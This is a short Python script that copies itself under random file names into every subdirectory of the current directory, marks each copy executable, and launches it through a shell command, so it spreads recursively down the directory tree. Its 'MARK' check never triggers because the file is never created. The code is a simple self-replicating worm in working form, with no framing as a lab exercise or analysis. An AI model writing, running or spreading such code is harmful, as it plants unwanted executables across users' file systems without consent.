import sys
import os
import random
import string


def getRandomString(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def copyFileToAnother(finput,foutput):
    with open(finput, "r") as f:
        with open(foutput, "w") as f1:
            for line in f:
                f1.write(line)
    os.chmod(foutput,0o775)

def getSubdirectories(path):
    my_dir = []
    directory_contents = os.listdir(path)
    for item in directory_contents:
        if os.path.isdir(item):
            my_dir.append(item)
    #print("DEBUG: getSubdirectories:", my_dir)
    return my_dir

def sprayToSubDir(actualpath,filename,dirList,mark):
    for dir in dirList:
        newFilename = getRandomString(8)+".py"
        if not isMarkHere(actualpath,dir,mark):
            copyFileToAnother(filename,actualpath+"/"+dir+"/"+newFilename)
            relaunch(actualpath,dir,newFilename)

def relaunch(actualpath,dir,file):
    os.system("cd "+actualpath+"/"+dir+"/ && "+"python "+file)

def isMarkHere(actualpath,directory,mark):
    return os.path.exists(actualpath+"/"+directory+"/"+mark)
        
def main(argv):
    if len(argv) != 1:
        print("usage: python {0}".format(argv[0]))
        sys.exit(1)

    mark = "MARK"
    dirpath = os.getcwd()
    print("---------------"+dirpath+"----------------")
    #print("DEBUG: main, actualpath='"+dirpath+"'")
    subdirectories = getSubdirectories(dirpath)
    sprayToSubDir(dirpath,argv[0],subdirectories,mark)

if __name__ == "__main__":
    main(sys.argv)